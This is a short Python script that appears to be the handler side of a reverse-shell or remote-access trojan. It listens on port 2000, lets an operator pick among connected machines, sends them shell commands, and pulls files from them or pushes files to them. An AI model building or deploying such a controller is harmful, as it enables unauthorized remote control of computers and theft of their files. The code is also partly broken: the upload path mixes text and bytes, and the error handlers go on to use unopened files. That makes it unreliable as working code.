#!/usr/bin/env python3

import sys
import socket
from socket import AF_INET, SOCK_STREAM
from common import pr, Send, Receive

# server socket
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()
server.settimeout(10)

# client sockets
socks = []
clients = []
active = False

def close(sock, client):
  sock.close()
  socks.remove(sock)
  clients.remove(client)
  refresh()

def refresh():
  pr('Listening for clients...')

  if not clients:
    pr('...')
    return

  for i in range(0, len(clients)):
    pr('Client %d: %s' % (i, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()
  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()
  except KeyboardInterrupt:
    pr('\r\r')
    activate = int(input('Enter option: '))

    if activate == -1:
      sys.exit()
    
    Send(socks[activate], 'activate')
    pr('Activating client ' + str(activate))

    sock = socks[activate]
    client = clients[activate]
    active = True

  while active:
    try:
      data = Receive(sock)
    except:
      active = False
      pr('Client %s disconnected.' % client)
      close(sock, client)
      break

    # ⬇️ dl file
    if data.endswith(b'FILEXXX'):
      data = data[:-7].split(b'FILENAMEXXX')
      d = b''.join(data[:-1])
      fn = data[-1].decode() # to str
      try:
        f = open(fn, 'wb')
      except IOError:
        print('Error opening file')
      f.write(d)
      f.close()
      continue # recv more

    else:
      print(data.decode(), end='')

    nc = ''
    while(not nc):
      nc = input().strip()

    if nc == '-1':
      close(sock, client)
      break

    if nc.startswith('ul '):
      fn = nc.split(' ')[1]
      try:
        f = open(fn, 'rb')
      except IOError:
        print('Error opening file')
      d = f.read()
      f.close()
      d += 'FILENAMEXXX%sFILEXXX' % fn
      Send(sock, d)
    
    else:
      Send(sock, nc)
